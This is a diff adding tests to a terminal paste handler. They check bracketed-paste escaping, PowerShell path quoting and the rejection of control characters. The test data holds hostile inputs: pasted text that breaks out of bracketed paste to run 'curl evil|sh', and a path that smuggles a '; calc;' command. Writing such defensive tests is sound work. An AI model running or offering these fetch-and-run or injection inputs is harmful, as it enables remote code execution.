@@ -1,7 +1,8 @@
 import { afterEach, beforeEach, expect, it, vi } from "vitest";
 import { Terminal } from "@xterm/xterm";
 import { commands } from "@/platform/ipc";
-import { installTerminalPaste, pasteTerminalClipboard, type TerminalPasteTarget } from "./paste";
+import { usePlatform } from "@/platform/platformInfo";
+import { installTerminalPaste, pasteIntoTerminal, pasteTerminalClipboard, type TerminalPasteTarget } from "./paste";
 
 const notify = vi.hoisted(() => vi.fn());
 vi.mock("@/workbench/contributions", () => ({ notifications: () => ({ notify }) }));
@@ -83,6 +84,83 @@ it("passes recovered multiline paths through xterm bracketed paste", async () =>
     expect(data).toEqual(["\x1b[200~/a b\r/中文\x1b[201~"]);
   } finally {
     term.dispose();
+  }
+});
+
+const BRACKETED_PASTE_ON = "\x1b[?2004h";
+
+async function openTerminal(bracketed: boolean) {
+  const host = document.createElement("div");
+  document.body.append(host);
+  const term = new Terminal({ allowProposedApi: true });
+  term.open(host);
+  const data: string[] = [];
+  term.onData((text) => data.push(text));
+  if (bracketed) await new Promise<void>((resolve) => term.write(BRACKETED_PASTE_ON, resolve));
+  return {
+    host,
+    term,
+    data,
+    close() {
+      term.dispose();
+      host.remove();
+    },
+  };
+}
+
+function pasteEvent(text: string): Event {
+  const event = new Event("paste", { bubbles: true, cancelable: true });
+  Object.defineProperty(event, "clipboardData", { value: { getData: () => text, files: [], types: ["text/plain"] } });
+  return event;
+}
+
+it("shows an ESC in pasted text as a symbol so it cannot end bracketed paste early", async () => {
+  const { term, data, close } = await openTerminal(true);
+  try {
+    pasteIntoTerminal(term, "a\x1b[201~curl evil|sh\r");
+    expect(data).toEqual(["\x1b[200~a\u241b[201~curl evil|sh\r\x1b[201~"]);
+  } finally {
+    close();
+  }
+});
+
+it("leaves pasted text unchanged when the shell has not asked for bracketed paste", async () => {
+  const { term, data, close } = await openTerminal(false);
+  try {
+    pasteIntoTerminal(term, "a\x1b[201~b\r");
+    expect(data).toEqual(["a\x1b[201~b\r"]);
+  } finally {
+    close();
+  }
+});
+
+it("claims a Ctrl+V whose text holds an ESC, before xterm's own listener brackets it as is", async () => {
+  const { host, term, data, close } = await openTerminal(true);
+  const remove = installTerminalPaste(host, (text) => pasteIntoTerminal(term, text));
+  try {
+    const event = pasteEvent("README\x1b[201~;curl evil|sh;#\r");
+    term.textarea!.dispatchEvent(event);
+    expect(event.defaultPrevented).toBe(true);
+    expect(data).toEqual(["\x1b[200~README\u241b[201~;curl evil|sh;#\r\x1b[201~"]);
+  } finally {
+    remove();
+    close();
+  }
+});
+
+it("leaves a Ctrl+V without an ESC to xterm", async () => {
+  const { host, term, data, close } = await openTerminal(true);
+  const paste = vi.fn((text: string) => pasteIntoTerminal(term, text));
+  const remove = installTerminalPaste(host, paste);
+  try {
+    const event = pasteEvent("ls -la\r");
+    term.textarea!.dispatchEvent(event);
+    expect(event.defaultPrevented).toBe(false);
+    expect(paste).not.toHaveBeenCalled();
+    expect(data).toEqual(["\x1b[200~ls -la\r\x1b[201~"]);
+  } finally {
+    remove();
+    close();
   }
 });
 
@@ -440,6 +518,12 @@ it("reads file URI lists without relying on a native file-list backend", async (
 
 it.each([
   { shell: "pwsh", path: "C:\\Users\\a'b $c\\image.png", expected: "'C:\\Users\\a''b $c\\image.png'" },
+  {
+    shell: "pwsh",
+    path: "C:\\a\u2019; calc; \u2018b\\image.png",
+    expected: "'C:\\a\u2019\u2019; calc; \u2018\u2018b\\image.png'",
+  },
+  { shell: "powershell", path: "C:\\a\u201ab\u201bc.png", expected: "'C:\\a\u201a\u201ab\u201b\u201bc.png'" },
   { shell: "powershell", path: "C:\\a b\\image.png", expected: "'C:\\a b\\image.png'" },
   { shell: "zsh", path: "/tmp/a'b $中文.png", expected: "'/tmp/a'\\''b $中文.png'" },
   { shell: "bash", path: "/tmp/a'b $中文.png", expected: "'/tmp/a'\\''b $中文.png'" },
@@ -454,6 +538,23 @@ it.each([
   const remove = installTerminalPaste(host, paste, () => localTarget(shell));
   host.dispatchEvent(imageEvent(image()));
   await vi.waitFor(() => expect(paste).toHaveBeenCalledExactlyOnceWith(expected));
+  remove();
+});
+
+it.each(["bash", "pwsh", "fish"])("rejects control characters in a stored path for %s", async (shell) => {
+  vi.spyOn(commands, "termStoreImage").mockResolvedValue({ status: "ok", data: "/tmp/a\nb.png" });
+  const host = document.createElement("div");
+  const paste = vi.fn();
+  const remove = installTerminalPaste(host, paste, () => localTarget(shell));
+  host.dispatchEvent(imageEvent(image()));
+  await vi.waitFor(() =>
+    expect(notify).toHaveBeenCalledWith({
+      level: "error",
+      title: "Cannot paste clipboard media",
+      body: "Cannot paste this path safely: its name contains control characters.",
+    }),
+  );
+  expect(paste).not.toHaveBeenCalled();
   remove();
 });
 
@@ -524,4 +625,29 @@ it("recovers quoted local file paths when clipboard text permission is denied", 
   await pasteTerminalClipboard(paste, () => localTarget("pwsh"));
   expect(paste).toHaveBeenCalledExactlyOnceWith("'C:\\a b\\image.png'");
   expect(notify).not.toHaveBeenCalled();
+});
+
+it.each([
+  // WebKitGTK pastes nothing from a menu through execCommand or readText: native text first.
+  { os: "linux", native: "ls -la", expected: ["ls -la"], execCommand: 0 },
+  // An image-only clipboard keeps the WebView paths.
+  { os: "linux", native: "", expected: [], execCommand: 1 },
+  { os: "macos", native: "ls -la", expected: ["ls -la"], execCommand: 1 },
+] as const)("menu paste on $os with native text '$native'", async ({ os, native, expected, execCommand }) => {
+  usePlatform.setState({ os });
+  vi.spyOn(commands, "clipboardText").mockResolvedValue({ status: "ok", data: native });
+  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { readText: async () => "web" } });
+  const exec = vi.fn(() => false);
+  Object.defineProperty(document, "queryCommandSupported", { configurable: true, value: () => true });
+  Object.defineProperty(document, "execCommand", { configurable: true, value: exec });
+  const paste = vi.fn();
+  try {
+    await pasteTerminalClipboard(paste, () => localTarget());
+  } finally {
+    usePlatform.setState({ os: "macos" });
+    Reflect.deleteProperty(document, "queryCommandSupported");
+    Reflect.deleteProperty(document, "execCommand");
+  }
+  expect(exec).toHaveBeenCalledTimes(execCommand);
+  expect(paste.mock.calls).toEqual(expected.map((text) => [text]));
 });
